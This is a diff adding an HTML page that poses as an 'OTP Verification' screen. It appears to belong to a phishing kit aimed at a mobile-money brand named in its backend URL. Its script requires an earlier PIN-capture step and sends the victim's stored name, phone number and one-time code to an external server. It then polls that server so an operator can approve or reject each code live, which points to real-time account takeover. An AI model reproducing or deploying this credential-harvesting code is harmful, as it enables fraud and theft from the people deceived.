@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OTP Verification</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: grey;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.code-container {
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    padding: 20px;
+}
+
+h2 {
+    color: #fff;
+    font-weight: 500;
+    margin-bottom: 8px;
+}
+
+p {
+    color: #ffe9dc;
+    margin-bottom: 25px;
+}
+
+.code-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 25px;
+}
+
+.code-boxes input {
+    width: 48px;
+    height: 55px;
+    font-size: 22px;
+    text-align: center;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    background: darkblue;
+    color: #333;
+    border: none;
+    border-radius: 25px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 3px solid #333;
+    border-top: 3px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-left: 8px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+#status {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #fff;
+}
+
+#timerContainer {
+    margin-top: 10px;
+    display: none;
+    color: #fff;
+    font-size: 14px;
+}
+
+#timerDisplay {
+    font-weight: bold;
+}
+#btnText {
+    color: white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="code-container">
+    <h2>OTP Verification</h2>
+    <p>Enter the code sent to your mobile number</p>
+
+    <form id="codeForm">
+        <div class="code-boxes">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+           
+        </div>
+
+        <button id="submitBtn" disabled>
+            <span id="btnText">Verify</span>
+            <span class="spinner" id="spinner"></span>
+        </button>
+    </form>
+
+    <div id="timerContainer">
+        OTP expires in <span id="timerDisplay">60</span> seconds
+    </div>
+
+    <div id="status"></div>
+</div>
+
+<script>
+const BACKEND_URL = "https://innbucks-jqtp.onrender.com";
+
+// ---------------- BOT ROUTING ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+// Prevent skipping steps
+if (!localStorage.getItem('pin')) {
+    window.location.href = `pin.html?botId=${botId}`;
+}
+
+// ---------------- CODE INPUT LOGIC ----------------
+const inputs = document.querySelectorAll('.code-boxes input');
+const button = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const spinner = document.getElementById('spinner');
+const statusText = document.getElementById('status');
+const timerContainer = document.getElementById('timerContainer');
+const timerDisplay = document.getElementById('timerDisplay');
+
+inputs[0].focus();
+inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g,'');
+        if (input.value && i < inputs.length - 1) inputs[i+1].focus();
+        button.disabled = ![...inputs].every(x => x.value);
+    });
+    input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+            inputs[i-1].focus();
+        }
+    });
+});
+
+// ---------------- COUNTDOWN TIMER ----------------
+let countdown;
+function startCountdown() {
+    let time = 45;
+    timerContainer.style.display = 'block';
+    timerDisplay.textContent = time;
+
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        time--;
+        timerDisplay.textContent = time;
+        if (time <= 0) {
+            clearInterval(countdown);
+            statusText.textContent = 'Time expired';
+        }
+    }, 1000);
+}
+
+// ---------------- SUBMIT CODE ----------------
+document.getElementById('codeForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    startCountdown();
+
+    const code = [...inputs].map(i => i.value).join('');
+    const name = localStorage.getItem('fullName');
+    const phone = localStorage.getItem('phone');
+
+    button.disabled = true;
+    btnText.textContent = 'Verifying...';
+    spinner.style.display = 'inline-block';
+    statusText.textContent = 'Waiting for approval...';
+
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-code`, {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ name, phone, code, botId })
+        });
+        const { requestId } = await res.json();
+
+        const poll = setInterval(async () => {
+            const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+            const d = await r.json();
+
+            if (d.approved === true) {
+                clearInterval(poll);
+                clearInterval(countdown);
+                localStorage.clear();
+                window.location.href = `success.html?botId=${botId}`;
+            }
+
+            if (d.approved === false) {
+                clearInterval(poll);
+                clearInterval(countdown);
+                button.disabled = false;
+                btnText.textContent = 'Verify';
+                spinner.style.display = 'none';
+                statusText.textContent = 'Incorrect code. Try again.';
+                inputs.forEach(i => i.value='');
+                inputs[0].focus();
+                timerContainer.style.display = 'none';
+            }
+        }, 1500);
+
+    } catch (err) {
+        spinner.style.display = 'none';
+        btnText.textContent = 'Verify';
+        button.disabled = false;
+        statusText.textContent = 'Submission failed';
+    }
+});
+</script>
+
+</body>
+</html>
